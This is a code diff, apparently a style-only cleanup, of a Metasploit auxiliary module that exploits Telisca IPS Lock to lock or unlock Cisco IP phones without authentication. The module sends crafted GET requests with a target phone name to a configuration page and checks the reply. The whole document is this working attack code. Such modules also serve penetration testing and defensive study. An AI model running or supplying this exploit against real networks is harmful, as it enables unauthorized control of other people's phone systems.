@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,57 +7,55 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Telisca IPS Lock Cisco IP Phone Control',
-      'Description'    => %q{
-        This module allows an unauthenticated attacker to exercise the
-        "Lock" and "Unlock" functionality of Telisca IPS Lock for Cisco IP
-        Phones. This module should be run in the VoIP VLAN, and requires
-        knowledge of the target phone's name (for example, SEP002497AB1D4B).
+                      'Name'           => 'Telisca IPS Lock Cisco IP Phone Control',
+                      'Description'    => %q{
+                        This module allows an unauthenticated attacker to exercise the
+                        "Lock" and "Unlock" functionality of Telisca IPS Lock for Cisco IP
+                        Phones. This module should be run in the VoIP VLAN, and requires
+                        knowledge of the target phone's name (for example, SEP002497AB1D4B).
 
-        Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.
-      },
-      'References'     =>
-        [
-          # Publicly disclosed via Metaploit PR
-          'URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'
-        ],
-      'Author'         =>
-        [
-          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
-          'zirsalem'
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Dec 17 2015',
-      'Actions'        =>
-       [
-         ['LOCK', 'Description' => 'To lock a phone'],
-         ['UNLOCK', 'Description' => 'To unlock a phone']
-       ],
-       'DefaultAction' => 'UNLOCK'
-    ))
+                        Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.
+                      },
+                      'References'     =>
+                        [
+                          # Publicly disclosed via Metaploit PR
+                          'URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'
+                        ],
+                      'Author'         =>
+                        [
+                          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
+                          'zirsalem'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => 'Dec 17 2015',
+                      'Actions'        =>
+                       [
+                         ['LOCK', 'Description' => 'To lock a phone'],
+                         ['UNLOCK', 'Description' => 'To unlock a phone']
+                       ],
+                      'DefaultAction' => 'UNLOCK'))
 
     register_options(
       [
         OptAddress.new('RHOST', [true, 'The IPS Lock IP Address']),
         OptString.new('PHONENAME', [true, 'The name of the target phone'])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
-  def print_status(msg='')
+  def print_status(msg = '')
     super("#{peer} - #{msg}")
   end
 
-  def print_good(msg='')
+  def print_good(msg = '')
     super("#{peer} - #{msg}")
   end
 
-  def print_error(msg='')
+  def print_error(msg = '')
     super("#{peer} - #{msg}")
   end
 
@@ -65,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
   # @return [Boolean] TrueClass if port open, otherwise FalseClass.
   def port_open?
     begin
-      res = send_request_raw({'method' => 'GET', 'uri' => '/'})
+      res = send_request_raw('method' => 'GET', 'uri' => '/')
       return true if res
     rescue ::Rex::ConnectionRefused
       vprint_status("Connection refused")
@@ -84,22 +83,20 @@ class MetasploitModule < Msf::Auxiliary
   #
   # @return [void]
   def lock(phone_name)
-    res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => '/IPSPCFG/user/Default.aspx',
-      'headers'   => {
-        'Connection' => 'keep-alive',
-        'Accept-Language' => 'en-US,en;q=0.5'
-      },
-      'vars_get'  => {
-        'action'  => 'DO',
-        'tg' => 'L',
-        'pn' => phone_name,
-        'dp' => '',
-        'gr' => '',
-        'gl' => ''
-      }
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri'       => '/IPSPCFG/user/Default.aspx',
+                           'headers'   => {
+                             'Connection' => 'keep-alive',
+                             'Accept-Language' => 'en-US,en;q=0.5'
+                           },
+                           'vars_get' => {
+                             'action' => 'DO',
+                             'tg' => 'L',
+                             'pn' => phone_name,
+                             'dp' => '',
+                             'gr' => '',
+                             'gl' => ''
+                           })
 
     if res && res.code == 200
       if res.body.include?('Unlock') || res.body.include?('U7LCK')
@@ -114,26 +111,23 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   # Unlocks a phone.
   #
   # @param phone_name [String] Name of the phone used for the pn parameter.
   #
   # @return [void]
   def unlock(phone_name)
-    res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => '/IPSPCFG/user/Default.aspx',
-      'headers'   => {
-        'Connection' => 'keep-alive',
-        'Accept-Language' => 'en-US,en;q=0.5'
-      },
-      'vars_get' => {
-        'action' => 'U7LCK',
-        'pn'     => phone_name,
-        'dp'     => ''
-      }
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri'       => '/IPSPCFG/user/Default.aspx',
+                           'headers'   => {
+                             'Connection' => 'keep-alive',
+                             'Accept-Language' => 'en-US,en;q=0.5'
+                           },
+                           'vars_get' => {
+                             'action' => 'U7LCK',
+                             'pn'     => phone_name,
+                             'dp'     => ''
+                           })
 
     if res && res.code == 200
       if res.body.include?('Unlock') || res.body.include?('U7LCK')
@@ -148,7 +142,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def run
     unless port_open?
       print_error('The web server is unreachable!')
@@ -157,10 +150,10 @@ class MetasploitModule < Msf::Auxiliary
 
     phone_name = datastore['PHONENAME']
     case action.name
-      when 'LOCK'
-        lock(phone_name)
-      when 'UNLOCK'
-        unlock(phone_name)
+    when 'LOCK'
+      lock(phone_name)
+    when 'UNLOCK'
+      unlock(phone_name)
     end
   end
 end
